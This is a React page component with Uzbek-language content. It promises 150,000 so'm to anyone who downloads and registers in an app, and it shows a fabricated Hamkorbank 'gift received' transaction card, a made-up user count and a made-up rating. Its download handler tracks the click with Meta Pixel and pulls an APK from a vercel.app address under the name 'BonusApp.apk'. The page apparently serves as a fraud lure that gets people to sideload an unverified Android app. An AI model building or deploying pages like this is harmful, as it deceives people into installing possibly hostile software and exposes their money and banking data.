import React from 'react';

// Этот компонент должен находиться в './pages/bonus.js'
export default function Bonus() {
  const handleDownload = (e) => {
    e.preventDefault();

    // ДОБАВЛЕНИЕ: Отправка пользовательского события 'Download' в Meta Pixel
    if (window.fbq) {
      // Отправляем событие "Download" (можно назвать как угодно)
      // с параметрами для лучшей отчетности
      window.fbq('track', 'Download', {
        content_name: 'BonusApp Download',
        value: 150000,
        currency: 'UZS' // Валюта
      });
      console.log("Meta Pixel: 'Download' event tracked.");
    } else {
      console.log("Meta Pixel (fbq) not available.");
    }

    const link = document.createElement('a');
    // Используем оригинальный URL для скачивания
    link.href = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
    link.download = 'BonusApp.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const baseContainerStyle = {
    minHeight: '100vh',
    background: 'linear-gradient(135deg, #4f46e5 0%, #8b5cf6 50%, #ec4899 100%)',
    color: 'white',
    fontFamily: 'Inter, system-ui, sans-serif',
    padding: '1.5rem',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    overflowX: 'hidden',
    textAlign: 'center'
  };

  const leftColumnStyle = {
    width: '100%',
    maxWidth: '500px',
    textAlign: 'left',
    marginBottom: '2.5rem',
  };

  const rightColumnStyle = {
    width: '100%',
    maxWidth: '400px',
    background: 'white',
    color: '#1f2937',
    borderRadius: '1.5rem',
    padding: '2rem',
    boxShadow: '0 20px 50px rgba(0,0,0,0.3)',
    textAlign: 'left',
    marginTop: '2.5rem',
  };

  const buttonBaseStyle = {
    background: 'linear-gradient(to right, #fbbf24, #f59e0b)',
    color: '#000',
    border: 'none',
    padding: '1rem 2rem',
    fontSize: '1.25rem',
    fontWeight: 'bold',
    borderRadius: '9999px',
    cursor: 'pointer',
    boxShadow: '0 10px 25px rgba(245, 158, 11, 0.4)',
    transition: 'all 0.3s ease',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    gap: '0.75rem',
    width: '100%',
    margin: '0 auto',
  };

  // Эффекты hover с помощью JS-стилей
  const handleButtonHover = (e, hover) => {
    e.currentTarget.style.transform = hover ? 'scale(1.03)' : 'scale(1)';
    e.currentTarget.style.boxShadow = hover 
      ? '0 15px 35px rgba(245, 158, 11, 0.6)' 
      : '0 10px 25px rgba(245, 158, 11, 0.4)';
  };

  return (
    <div style={baseContainerStyle} className="main-container">
      {/* Левая колонка - Контент */}
      <div style={leftColumnStyle} className="content-section">
        
        {/* Метка "Maxsus taklif" */}
        <div style={{
          background: 'rgba(255,255,255,0.2)',
          color: 'white',
          padding: '4px 16px',
          borderRadius: '20px',
          fontSize: '0.875rem',
          display: 'inline-block',
          marginBottom: '1rem',
          border: '1px solid rgba(255,255,255,0.3)',
          fontWeight: '500',
          letterSpacing: '0.05em'
        }}>
          🎁 Maxsus taklif
        </div>

        {/* Большая сумма (H1) */}
        <h1 className="main-heading" style={{
          fontSize: '2.5rem', 
          fontWeight: '900',
          color: '#fcd34d', 
          lineHeight: 1.2,
          marginBottom: '0.5rem'
        }}>
          150 000 so‘m
        </h1>
        
        {/* Заголовок (H2) */}
        <h2 className="sub-heading" style={{
          fontSize: '2rem', 
          fontWeight: '800',
          marginBottom: '1.5rem',
          lineHeight: 1.3
        }}>
          sovg‘a olish!
        </h2>

        {/* Описание */}
        <p style={{
          fontSize: '1.125rem', 
          marginBottom: '2rem',
          lineHeight: 1.6,
          color: 'rgba(255,255,255,0.9)'
        }}>
          Ilovani yuklab oling va ro‘yxatdan o‘ting — darhol <span style={{ color: '#fcd34d', fontWeight: '600' }}>150 000 so‘m</span> kartangizga sovg‘a sifatida tushadi. Faqat yangi foydalanuvchilar uchun!
        </p>

        {/* Список преимуществ */}
        <div style={{ marginBottom: '2.5rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          {[
            {
              icon: '📱',
              title: 'Ilovani yuklab oling',
              subtitle: 'Android yoki iOS'
            },
            {
              icon: '✅',
              title: 'Ro‘yxatdan o‘ting',
              subtitle: 'Faqat telefon raqamingiz kerak'
            },
            {
              icon: '🎁',
              title: '150 000 so‘m oling!',
              subtitle: 'Avtomatik kartangizga'
            }
          ].map((item, i) => (
            <div 
              key={i} 
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '1rem',
                padding: '1rem',
                borderRadius: '0.75rem',
                background: 'rgba(255,255,255,0.1)',
                transition: 'background 0.2s',
                cursor: 'pointer'
              }} 
              onMouseOver={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.15)'; }} 
              onMouseOut={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.1)'; }}
            >
              <div style={{
                width: '44px',
                height: '44px',
                borderRadius: '50%',
                background: '#fcd34d', 
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#000',
                fontWeight: 'bold',
                fontSize: '1.25rem',
                flexShrink: 0
              }}>
                {item.icon}
              </div>
              <div>
                <div style={{ fontWeight: '700', fontSize: '1.125rem' }}>{item.title}</div>
                <div style={{ fontSize: '0.875rem', color: 'rgba(255,255,255,0.8)' }}>{item.subtitle}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Кнопка */}
        <button
          onClick={handleDownload}
          style={buttonBaseStyle}
          onMouseOver={(e) => handleButtonHover(e, true)}
          onMouseOut={(e) => handleButtonHover(e, false)}
        >
          🎁 Sovg‘ani olish →
        </button>

        {/* Рейтинг */}
        <div style={{
          marginTop: '1.5rem',
          fontSize: '0.875rem',
          color: 'rgba(255,255,255,0.7)',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '0.25rem'
        }} className="rating-info">
          <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            <span style={{ color: '#fcd34d' }}>⭐</span> 4.9/5
          </div>
          <span className="separator" style={{ display: 'none' }}>•</span>
          <span>46,000+ foydalanuvchi sovg‘a oldi</span>
        </div>
      </div>

      {/* Правая колонка — имитация транзакции (Карточка) */}
      <div style={rightColumnStyle} className="card-section">
        
        {/* Заголовок банка */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          marginBottom: '1.5rem'
        }}>
          <div style={{
            width: '48px',
            height: '48px',
            borderRadius: '0.75rem',
            background: '#10b981',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginRight: '1rem',
            flexShrink: 0
          }}>
            <span style={{ color: 'white', fontSize: '1.5rem', fontWeight: 'bold' }}>H</span>
          </div>
          <div>
            <div style={{ fontWeight: '800', fontSize: '1.125rem' }}>Hamkorbank</div>
            <div style={{ fontSize: '0.875rem', color: '#6b7280' }}>Plastik karta</div>
          </div>
        </div>

        {/* Разделитель */}
        <div style={{
          borderTop: '1px dashed #d1d5db',
          margin: '1.5rem 0'
        }}></div>

        {/* Детали транзакции */}
        <div style={{ marginBottom: '1.5rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <div>
            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Tranzaksiya</div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '1rem', fontWeight: '500' }}>
              <span>🎁</span>
              <span>Xush kelibsiz sovg‘asi</span>
            </div>
          </div>
          
          <div>
            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Sana va vaqt</div>
            <div style={{ fontSize: '1rem', fontWeight: '500' }}>5-noyabr, 2025 • 14:23</div>
          </div>

          <div>
            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Karta raqimi</div>
            <div style={{ fontSize: '1rem', fontWeight: '500' }}>8600 **** **** 4521</div>
          </div>
        </div>

        {/* Блок суммы */}
        <div style={{
          background: '#fffbeb',
          border: '2px solid #fbbf24',
          borderRadius: '0.75rem',
          padding: '1.25rem',
          marginBottom: '1.5rem',
          position: 'relative',
          overflow: 'hidden'
        }}>
          <div style={{
            position: 'absolute',
            top: '10px',
            right: '10px',
            fontSize: '2.25rem',
            opacity: 0.1
          }}>🎁</div>
          <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Sovg‘a olindi</div>
          <div style={{
            fontSize: '2.5rem',
            fontWeight: '900',
            color: '#ef4444',
            marginBottom: '4px'
          }}>
            +150 000
          </div>
          <div style={{ fontSize: '1rem', color: '#4b5563' }}>so‘m</div>
        </div>

        {/* Статус */}
        <div style={{ marginBottom: '1.5rem' }}>
          <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Status</div>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
            color: '#10b981',
            fontWeight: '700'
          }}>
            <div style={{
              width: '10px',
              height: '10px',
              borderRadius: '50%',
              background: '#10b981'
            }}></div>
            Muvaffaqiyatli
          </div>
        </div>

        {/* Разделитель */}
        <div style={{
          borderTop: '1px dashed #d1d5db',
          margin: '1.5rem 0'
        }}></div>

        {/* Кнопка подтверждения */}
        <div style={{
          textAlign: 'center'
        }}>
          <button style={{
            background: '#d1fae5',
            color: '#047857',
            border: 'none',
            padding: '10px 20px',
            borderRadius: '9999px',
            fontSize: '0.875rem',
            fontWeight: '600',
            cursor: 'pointer',
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px',
            transition: 'background 0.2s'
          }} onMouseOver={(e) => {
            e.currentTarget.style.background = '#a7f3d0';
          }} onMouseOut={(e) => {
            e.currentTarget.style.background = '#d1fae5';
          }}>
            ✅ Tasdiqlangan
          </button>
        </div>

        {/* ID транзакции */}
        <div style={{
          marginTop: '1rem',
          fontSize: '0.75rem',
          color: '#9ca3af',
          textAlign: 'center'
        }}>
          ID: TXN-2025-1104-87392
        </div>
      </div>

      {/* Адаптивность с помощью CSS Media Queries */}
      <style>{`
        /* Стили для экранов больше 1024px (lg) */
        @media (min-width: 1024px) {
          .main-container {
            flex-direction: row;
          }
          .content-section {
            width: auto;
            flex: 1; 
            max-width: 500px;
            margin-right: 4rem; 
            margin-bottom: 0;
          }
          .card-section {
            width: auto;
            flex: 1;
            max-width: 400px;
            margin-top: 0;
          }
          .main-heading {
            font-size: 4rem !important; 
          }
          .sub-heading {
            font-size: 3rem !important; 
          }
          button {
            width: 384px !important; 
          }
          .rating-info {
            flex-direction: row !important;
            justify-content: flex-start !important;
            gap: 0.75rem !important;
          }
          .separator {
            display: block !important;
          }
        }

        /* Дополнительная адаптивность для больших мобильных экранов (sm) */
        @media (min-width: 640px) and (max-width: 1023px) {
           .main-heading {
            font-size: 3rem !important; 
          }
          .sub-heading {
            font-size: 2.5rem !important; 
          }
          .rating-info {
            flex-direction: row !important;
            justify-content: center !important;
            gap: 0.75rem !important;
          }
          .separator {
            display: block !important;
          }
        }
      `}</style>
    </div>
  );
}